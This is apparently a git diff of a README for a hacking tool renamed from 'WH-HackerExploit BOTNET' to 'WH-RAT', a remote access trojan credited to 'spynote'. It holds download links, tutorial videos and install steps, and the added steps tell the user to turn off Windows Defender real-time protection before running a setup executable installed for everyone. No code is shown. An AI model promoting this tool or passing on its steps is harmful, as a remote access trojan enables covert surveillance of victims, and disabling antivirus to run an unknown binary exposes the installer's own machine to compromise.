@@ -1,9 +1,12 @@
-# 🏳 WH-HackerExploit BOTNET 🔞
+# 🏳 WH-HackerExploit (WH - RAT) 🔞
 Usage of WH-HackerExploit Hacking Tool for attacking targets without prior mutual  consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes. 
 
 # ➰ requirements PKG
+
 ☆ net framework 3.5 and 4.6.1  [ only windows system ]
+
 ☆ java > jdk & jre
+
 
 # 💿 SYSTEM TEST
 1. Windows 10   [ Recommended System ]  
@@ -18,17 +21,21 @@ Usage of WH-HackerExploit Hacking Tool for attacking targets without prior mutua
 
 # 💡 HOW TO INSTALL in WINDOWS
 
-1. Download Zip file https://github.com/wh-hackerexploit/WH-BotNet/archive/master.zip
-
+1. Download Zip file https://github.com/wh-hackerexploit/WH-RAT/archive/master.zip
 
 2. Opne up Windows directory
 
-3. Now, Run WinBot.exe 
+3. Now, Unzip your download file (WH-RAT-master.zip) 
 
-4. 1st install (click Install Button)
+4. and open directory
 
-5. 2nd install (Node Insall Button )
+5. now , windows defender turn off real time protection
 
+6. and run ( WH-Rat-setup-v1.1.exe )
+ 
+7. now , click (install) button
+
+8. select (EveryOne) and next all .
 
 
 
@@ -42,13 +49,13 @@ Usage of WH-HackerExploit Hacking Tool for attacking targets without prior mutua
 
  ☆ how to use in pc ⏬
  
-🏳 [WH-HackerExploit BOTNET Advance penetration framework VIDEO ( PC )]( https://www.youtube.com/watch?v=_F94hJPQ6JE&feature=youtu.be "WH-HackerExploit BOTNET Advance penetration framework ( PC ) ") 
+🏳 [WH-HackerExploit WH-RAT Advance penetration framework VIDEO ( PC )]( https://www.youtube.com/watch?v=_F94hJPQ6JE&feature=youtu.be "WH-HackerExploit BOTNET Advance penetration framework ( PC ) ") 
 
 
 
 ☆ How to Use in Android ⏬
 
-🏳 [WH-HackerExploit BOTNET Advance penetration framework VIDEO ( Termux )]( https://www.youtube.com/watch?v=gMm-D8-6wgY "WH-HackerExploit BOTNET Advance penetration framework ( termux ") 
+🏳 [WH-HackerExploit WH-RAT Advance penetration framework VIDEO ( Termux )]( https://www.youtube.com/watch?v=gMm-D8-6wgY "WH-HackerExploit BOTNET Advance penetration framework ( termux ") 
 
 
 
@@ -56,13 +63,13 @@ Usage of WH-HackerExploit Hacking Tool for attacking targets without prior mutua
 
 
 
-[![IMAGE 1](https://raw.githubusercontent.com/wh-hackerexploit/WH-BotNet/master/IMG/whb-1.png)](https://www.youtube.com/channel/UCj6ekUzjItnjP6T7I9r1WMA?sub_confirmation=1 "WH-HackerExploit BOTNET Advance Android penetration framework")
+[![IMAGE 1](https://raw.githubusercontent.com/wh-hackerexploit/WH-BotNet/master/IMG/whb-1.png)](https://www.youtube.com/channel/UCj6ekUzjItnjP6T7I9r1WMA?sub_confirmation=1 "WH-HackerExploit WH-RAT Advance Android penetration framework")
 
-[![IMAGE 1](https://raw.githubusercontent.com/wh-hackerexploit/WH-BotNet/master/IMG/whb-2.png)](https://www.youtube.com/channel/UCj6ekUzjItnjP6T7I9r1WMA?sub_confirmation=1 "WH-HackerExploit BOTNET Advance Android penetration framework")
+[![IMAGE 1](https://raw.githubusercontent.com/wh-hackerexploit/WH-BotNet/master/IMG/whb-2.png)](https://www.youtube.com/channel/UCj6ekUzjItnjP6T7I9r1WMA?sub_confirmation=1 "WH-HackerExploit WH-RAT Advance Android penetration framework")
 
-[![IMAGE 1](https://raw.githubusercontent.com/wh-hackerexploit/WH-BotNet/master/IMG/whb-3.png)](https://www.youtube.com/channel/UCj6ekUzjItnjP6T7I9r1WMA?sub_confirmation=1 "WH-HackerExploit BOTNET Advance Android penetration framework")
+[![IMAGE 1](https://raw.githubusercontent.com/wh-hackerexploit/WH-BotNet/master/IMG/whb-3.png)](https://www.youtube.com/channel/UCj6ekUzjItnjP6T7I9r1WMA?sub_confirmation=1 "WH-HackerExploit WH-RAT Advance Android penetration framework")
 
-[![IMAGE 1](https://raw.githubusercontent.com/wh-hackerexploit/WH-BotNet/master/IMG/whb-4.png)](https://www.youtube.com/channel/UCj6ekUzjItnjP6T7I9r1WMA?sub_confirmation=1 "WH-HackerExploit BOTNET Advance Android penetration framework")
+[![IMAGE 1](https://raw.githubusercontent.com/wh-hackerexploit/WH-BotNet/master/IMG/whb-4.png)](https://www.youtube.com/channel/UCj6ekUzjItnjP6T7I9r1WMA?sub_confirmation=1 "WH-HackerExploit WH-RAT Advance Android penetration framework")
 
 
 <br /><br />
@@ -74,7 +81,7 @@ POWER BY >> WH-HackerExploit
 
 Developer: R47
 
-coeded by : ahmyth >> l3mon
+coeded by : spynote
 
                                  Apache License
                            Version 2.0, January 2004
